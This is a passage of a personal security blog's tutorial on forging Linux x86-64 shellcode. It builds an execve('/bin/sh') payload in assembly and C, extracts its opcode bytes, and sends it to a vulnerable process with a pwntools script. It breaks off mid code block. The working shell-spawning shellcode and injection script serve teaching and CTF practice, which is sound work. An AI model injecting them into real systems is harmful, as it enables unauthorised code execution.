<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="The Shellcode Blacksmith Sensei" /><meta name="author" content="Zeropio" /><meta property="og:locale" content="en" /><meta name="description" content="Diving into low level." /><meta property="og:description" content="Diving into low level." /><link rel="canonical" href="https://zeropio.ninja//sensei/shellcode-blacksmith" /><meta property="og:url" content="https://zeropio.ninja//sensei/shellcode-blacksmith" /><meta property="og:site_name" content="Zeropio’s Dojo" /><meta property="og:image" content="https://zeropio.ninja//assets/img/thumbnails/shellcoding.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-09T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zeropio.ninja//assets/img/thumbnails/shellcoding.png" /><meta property="twitter:title" content="The Shellcode Blacksmith Sensei" /><meta name="twitter:site" content="@ZeropioWasTaken" /><meta name="twitter:creator" content="@ZeropioWasTaken" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zeropio","url":"https://twitter.com/ZeropioWasTaken"},"dateModified":"2023-05-30T13:29:01+02:00","datePublished":"2023-05-09T00:00:00+02:00","description":"Diving into low level.","headline":"The Shellcode Blacksmith Sensei","image":"https://zeropio.ninja//assets/img/thumbnails/shellcoding.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zeropio.ninja//sensei/shellcode-blacksmith"},"url":"https://zeropio.ninja//sensei/shellcode-blacksmith"}</script><title>The Shellcode Blacksmith | Sensei | Zeropio's Dojo</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Zeropio's Dojo"><meta name="application-name" content="Zeropio's Dojo"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Zeropio's Dojo</a></div><div class="site-subtitle font-italic">Cyberninja</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/zeropio" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://ctftime.org/team/212175" aria-label="ctftime" target="_blank" rel="noopener noreferrer"> <i class="fas fa-flag"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener noreferrer"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/ZeropioWasTaken" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>The Shellcode Blacksmith | Sensei</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>The Shellcode Blacksmith | Sensei</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1683583200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 9, 2023 </em> </span> <span> Updated <em class="" data-ts="1685446141" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 30, 2023 </em> </span><div class="mt-3 mb-3"> <a href="/assets/img/thumbnails/shellcoding.png" class="popup img-link preview-img shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'%3E%3C/svg%3E" data-src="/assets/img/thumbnails/shellcoding.png" alt="Preview Image" width="1200" height="630" class="lazyload" data-proofer-ignore></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/ZeropioWasTaken">Zeropio</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3118 words"> <em>17 min</em> read</span></div></div></div><div class="post-content"><p><br /></p><p>Welcome to the first post of my series on various low level topics. In this series, I will focus as deeply as possible into more <em>advanced</em> topics, rather than simply explaining common vulnerabilities like SQL injection or XSS. Instead, I’ll be focusing on subjects that I find more interesting. Since this is my first post of this kind, I’d like to emphasize an important point. I know that many of you may not bother to read this post, so to grab your attention, I’ve uploaded it as an image. Don’t judge my graphical skills, plz. <a href="/assets/img/sensei/shellcode/dialogue-1.png" class="popup img-link "><img data-src="/assets/img/sensei/shellcode/dialogue-1.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><br /></p><hr /><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As one wise man once said: <a href="/assets/img/sensei/shellcode/sun-tzu.png" class="popup img-link "><img data-src="/assets/img/sensei/shellcode/sun-tzu.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>First things first, let’s answer a simple question: <strong>Who is the man in the picture above (not the Chinese one)?</strong> His name is <strong>John Von Neumann</strong>, one of the fathers of computing. Nowadays, almost all computer architectures, including x86, ARM, MIPS, and PPC, use the Von Neumann architecture. But what does this mean?</p><p>In the Von Neumann architecture, <strong>data is saved as code</strong>, which means that anything we save on the computer will be treated as code. This is the basic theory of <strong>shellcoding</strong>. If data can be executed as code, why not input actual code when a program asks for a name instead of our name? As <a href="https://twitter.com/XenoKovah">Xeno</a> denominates, <strong>ACID</strong> (<strong>A</strong>ttacker-<strong>C</strong>ontrolled <strong>I</strong>nput <strong>D</strong>ata, maybe a joke name but better than <em>tainted data</em>!).</p><p>The term <em>shellcode</em> comes from <em>shell</em> (because usually, you want to spawn a shell) and <em>code</em> (because… it’s code). The name was created in the famous post <a href="http://www.phrack.com/issues/49/14.html">Smashing the Stack for Fun and Profit</a>. This code needs to be inserted into the program. I won’t explain exploitation theory in this post, as it is focused on shellcoding. But it’s important to note that these vulnerabilities will open a window for inserting the shellcode, with some restrictions that will be covered later.</p><p>Typically, these shellcodes are injected onto the stack. Nowadays, with the <strong>NX</strong> protection, the stack is no longer executable. This has nearly mitigated all shellcoding for stack buffer overflow. But other systems, like embedded OS, still use an executable stack. Additionally, other exploitation methods allow the shellcode to be injected into an executable <strong>segment</strong><sup id="fnref:footnote" role="doc-noteref"><a href="#fn:footnote" class="footnote" rel="footnote">1</a></sup>.</p><p><br /></p><p>But you may still be wondering, <em>what is a shellcode</em>? Here is a simple example:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">1</span>
<span class="nf">int</span> <span class="mh">0x80</span> 
</pre></table></code></div></div><p>For those who don’t know what this code does, let’s introduce them to <strong>syscalls</strong>. <em>System calls</em> are instructions that directly communicate with the kernel in both Windows and Linux systems. Both kernels have an API with functions. Typically, we don’t interact with syscalls directly and let compilers do the work for us. But as we are creating shellcodes from scratch, we need to call them directly. There are some assembly instructions to make the call, like the <code class="language-plaintext highlighter-rouge">syscall</code> instruction that we will see later. But using kernel <strong>interrupts</strong><sup id="fnref:fn-nth-2" role="doc-noteref"><a href="#fn:fn-nth-2" class="footnote" rel="footnote">2</a></sup> will also make a syscall if the parameters are correct.</p><p>Some websites have documented all the syscalls available for each architecture, like <a href="https://syscall.sh/">syscall.sh</a>. But I personally recommend using the man command with each. For the <code class="language-plaintext highlighter-rouge">exit</code> syscall, we need to set the <strong>AL</strong> register (<strong>A</strong>ccumulator Register <strong>L</strong>ower 8 bits) to 1. To make sure the register is clean, we <code class="language-plaintext highlighter-rouge">xor</code> it by itself and then set the 8 lower bits to 1. Then, an interrupt to the 0x80 hex value (128 decimal) will trigger the <code class="language-plaintext highlighter-rouge">exit</code> syscall.</p><p>Maybe breaking a program is not the aim of our shellcode, but shellcodes can go as far as we want (or can). But this is just a simple example, and we will delve into more realistic shellcodes later.</p><p>As my knowledge is limited, I will only discuss Linux shellcodes for x86. In future posts, I may cover other architectures and operating systems.</p><p><br /></p><hr /><h2 id="forging-shellcodes"><span class="mr-2">Forging Shellcodes</span><a href="#forging-shellcodes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You may have noticed that these shellcodes consist only of assembly instructions. These instructions must be understandable by the system, and the program will not encode our instructions to <strong>opcodes</strong><sup id="fnref:fn-nth-3" role="doc-noteref"><a href="#fn:fn-nth-3" class="footnote" rel="footnote">3</a></sup>. Therefore, we need to find a way to obtain the opcodes in advance. While there is no limit to generating shellcodes, let’s talk about the two standard ways:</p><h3 id="asm-code"><span class="mr-2">ASM Code</span><a href="#asm-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can write our code directly in assembly. For example, we will generate a shellcode that executes <code class="language-plaintext highlighter-rouge">/bin/sh</code> using the <code class="language-plaintext highlighter-rouge">execve</code> system call:</p><div file="shellcode.s" class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="shellcode.s"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
  <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span><span class="nb">rsi</span>
  <span class="nf">push</span> <span class="nb">rsi</span>
  <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span><span class="mh">0x68732f2f6e69622f</span>
  <span class="nf">push</span> <span class="nb">rdi</span>
  <span class="nf">push</span> <span class="nb">rsp</span>
  <span class="nf">pop</span> <span class="nb">rdi</span>
  <span class="nf">push</span> <span class="mi">59</span>
  <span class="nf">pop</span> <span class="nb">rax</span>
  <span class="nf">cdq</span>
  <span class="nf">syscall</span>
</pre></table></code></div></div><p>The first two instructions clear the RSI register and push its value onto the stack:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span><span class="nb">rsi</span>
<span class="nf">push</span> <span class="nb">rsi</span>
</pre></table></code></div></div><p>Next, the address of the string <code class="language-plaintext highlighter-rouge">/bin/sh</code> is moved to the RDI register and pushed onto the stack:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span><span class="mh">0x68732f2f6e69622f</span> <span class="c1">; /bin/sh</span>
<span class="nf">push</span> <span class="nb">rdi</span>
</pre></table></code></div></div><p>We move the stack pointer into the RDI register, which is now pointing to the start of the <code class="language-plaintext highlighter-rouge">/bin/sh</code> string, and then push the value 59, which corresponds to the <code class="language-plaintext highlighter-rouge">execve</code> system call in x86_64 assembly, onto the stack:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">push</span> <span class="nb">rsp</span>
<span class="nf">pop</span> <span class="nb">rdi</span>
<span class="nf">push</span> <span class="mi">59</span>
</pre></table></code></div></div><p>Finally, we set the system call number in RAX, and perform the <code class="language-plaintext highlighter-rouge">execve</code> system call:</p><div class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="Nasm"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">pop</span> <span class="nb">rax</span>
<span class="nf">cdq</span>
<span class="nf">syscall</span>
</pre></table></code></div></div><p>We can compile the shellcode as any NASM file:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nasm <span class="nt">-f</span> elf64 shellcode.s <span class="nt">-o</span> shellcode.o
<span class="gp">$</span><span class="w"> </span>ld shellcode.o <span class="nt">-o</span> shellcode
</pre></table></code></div></div><blockquote class="prompt-info"><p>Another way to compile it is to use GCC: <code class="language-plaintext highlighter-rouge">gcc -nostdlib -static shellcode.s -o shellcode</code></p></blockquote><p>We can verify that the shellcode has been properly compiled:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> shellcode
<span class="go">
shellcode: file format elf64-x86-64


Disassembly of section .text:

</span><span class="gp">0000000000401000 &lt;_start&gt;</span>:
<span class="go">  401000:	48 31 f6 	xorrsi,rsi
  401003:	56   	push   rsi
  401004:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
  40100b:	2f 73 68 
  40100e:	57   	push   rdi
  40100f:	54   	push   rsp
  401010:	5f   	poprdi
  401011:	6a 3b	push   0x3b
  401013:	58   	poprax
  401014:	99   	cdq
  401015:	0f 05	syscall
</span></pre></table></code></div></div><p>Now take your sysadmins skills to shine, or as I did copy it from <a href="https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html">cocomelonc</a>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>objdump <span class="nt">-d</span> shellcode|grep <span class="s1">'[0-9a-f]:'</span>|grep <span class="nt">-v</span> <span class="s1">'file'</span>|cut <span class="nt">-f2</span> <span class="nt">-d</span>:|cut <span class="nt">-f1-6</span> <span class="nt">-d</span><span class="s1">' '</span>|tr <span class="nt">-s</span> <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span>|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-s</span> |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
<span class="go">
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
</span></pre></table></code></div></div><p>And we have our beautiful shellcode ready to be deployed. We can test it on our host system: <a href="/assets/img/sensei/shellcode/test-execve.png" class="popup img-link "><img data-src="/assets/img/sensei/shellcode/test-execve.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="c-code"><span class="mr-2">C Code</span><a href="#c-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, let’s create the same shellcode in C. Here is a simple program that will do the trick:</p><div file="shellcode.c" class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="shellcode.c"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Compile the code statically using the following command:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-o</span> shellcode <span class="nt">-ggdb</span> <span class="nt">-static</span> shellcode.c
</pre></table></code></div></div><p>You can extract the opcodes from the compiled binary using a disassembler, such as GDB. Here is an example of how to do this:</p><div file="GDB output" class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="GDB output"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="go">(gdb) disassemble main
Dump of assembler code for function main:
</span><span class="gp">   0x0000000000401765 &lt;+0&gt;</span>:	push   %rbp
<span class="gp">   0x0000000000401766 &lt;+1&gt;</span>:	mov%rsp,%rbp
<span class="gp">   0x0000000000401769 &lt;+4&gt;</span>:	sub<span class="nv">$0x20</span>,%rsp
<span class="gp">   0x000000000040176d &lt;+8&gt;</span>:	mov%fs:0x28,%rax
<span class="gp">   0x0000000000401776 &lt;+17&gt;</span>:	mov%rax,-0x8<span class="o">(</span>%rbp<span class="o">)</span>
<span class="gp">   0x000000000040177a &lt;+21&gt;</span>:	xor%eax,%eax
<span class="gp">   0x000000000040177c &lt;+23&gt;</span>:	lea0x73881<span class="o">(</span>%rip<span class="o">)</span>,%rax# 0x475004
<span class="gp">   0x0000000000401783 &lt;+30&gt;</span>:	mov%rax,-0x20<span class="o">(</span>%rbp<span class="o">)</span>
<span class="gp">   0x0000000000401787 &lt;+34&gt;</span>:	movq   <span class="nv">$0x0</span>,-0x18<span class="o">(</span>%rbp<span class="o">)</span>
<span class="gp">   0x000000000040178f &lt;+42&gt;</span>:	mov-0x20<span class="o">(</span>%rbp<span class="o">)</span>,%rax
<span class="gp">   0x0000000000401793 &lt;+46&gt;</span>:	lea-0x20<span class="o">(</span>%rbp<span class="o">)</span>,%rcx
<span class="gp">   0x0000000000401797 &lt;+50&gt;</span>:	mov<span class="nv">$0x0</span>,%edx
<span class="gp">   0x000000000040179c &lt;+55&gt;</span>:	mov%rcx,%rsi
<span class="gp">   0x000000000040179f &lt;+58&gt;</span>:	mov%rax,%rdi
<span class="gp">   0x00000000004017a2 &lt;+61&gt;</span>:	call   0x4104f0 &lt;execve&gt;
<span class="gp">   0x00000000004017a7 &lt;+66&gt;</span>:	nop
<span class="gp">   0x00000000004017a8 &lt;+67&gt;</span>:	mov-0x8<span class="o">(</span>%rbp<span class="o">)</span>,%rax
<span class="gp">   0x00000000004017ac &lt;+71&gt;</span>:	sub%fs:0x28,%rax
<span class="gp">   0x00000000004017b5 &lt;+80&gt;</span>:	je 0x4017bc &lt;main+87&gt;
<span class="gp">   0x00000000004017b7 &lt;+82&gt;</span>:	call   0x411480 &lt;__stack_chk_fail_local&gt;
<span class="gp">   0x00000000004017bc &lt;+87&gt;</span>:	leave
<span class="gp">   0x00000000004017bd &lt;+88&gt;</span>:	ret
<span class="go">End of assembler dump.
</span></pre></table></code></div></div><blockquote class="prompt-info"><p>I will not cover how to extract the opcodes from this, as we have already seen it.</p></blockquote><p><br /></p><p>There are other ways to send shellcode to a program. For example, suppose we have a binary that reads some input via <strong>stdin</strong>. In that case, we can use the <code class="language-plaintext highlighter-rouge">cat</code> command to send the input. As you may already know, this command replicates whatever input you send it (an empty cat command on the terminal will replicate each string you send). This command can be very useful when we need to send binaries to other binaries. For instance:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>shellcode | ./vulnerable
</pre></table></code></div></div><p>This will send the entire binary to the other binary, so we don’t need to extract the opcodes. The <strong>pwntools</strong> library in Python can help us send shellcode without even compiling it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="nf">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="sh">"</span><span class="s">linux</span><span class="sh">"</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span><span class="p">)</span>

<span class="n">sc</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"""</span><span class="s">
xor rsi,rsi
push rsi
mov rdi,0x68732f2f6e69622f
push rdi
push rsp
pop rdi
push 59
pop rax
cdq
syscall
</span><span class="sh">"""</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">/vulnerable</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>But we will discuss this library later.</p><p>Now the real magic of shellcoding begins. We need to go through the different system calls, choose the ones we want to execute, set the parameters, and call them. Easy, right? But the real problem arises when certain characters (such as null bytes) may trigger the program to stop, break some return values on the stack and make the program crash (which may not be ideal for a remote exploit), or even have a limited size to inject the shellcode.</p><p>This is when the difference between a good and a bad blacksmith is made. But don’t worry, not everyone is suited for smithing :).</p><p><br /></p><hr /><h2 id="debugging-it"><span class="mr-2">Debugging It!</span><a href="#debugging-it" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First off, why would we be interested in debugging our shellcode? As mentioned earlier, shellcoding is not as simple as just writing the code you want to execute. There are multiple factors that can cause our shellcode to crash without us even knowing. By debugging our shellcode, we can ensure that we have implemented it correctly and eliminate errors before they occur.</p><p>The first and most basic way to do this is by using the <code class="language-plaintext highlighter-rouge">strace</code> command. This command traces all the syscalls that your program is making. You can use the following syntax:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>strace ./shellcode
</pre></table></code></div></div><p>You can also debug the shellcode as stdin if you have the program locally:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>shellcode | strace ./vulnerable
</pre></table></code></div></div><p>This allows you to see what your shellcode is actually doing. The other, more obvious way is through <code class="language-plaintext highlighter-rouge">gdb</code>. Since you have complete control over your shellcode, you can even insert breakpoints outside of GDB using the <code class="language-plaintext highlighter-rouge">int</code> instruction, like this:</p><div file="shellcode.s" class="language-nasm highlighter-rouge"><div class="code-header"> <span data-label-text="shellcode.s"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>
<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
    <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span><span class="nb">rsi</span>
    <span class="nf">push</span> <span class="nb">rsi</span>
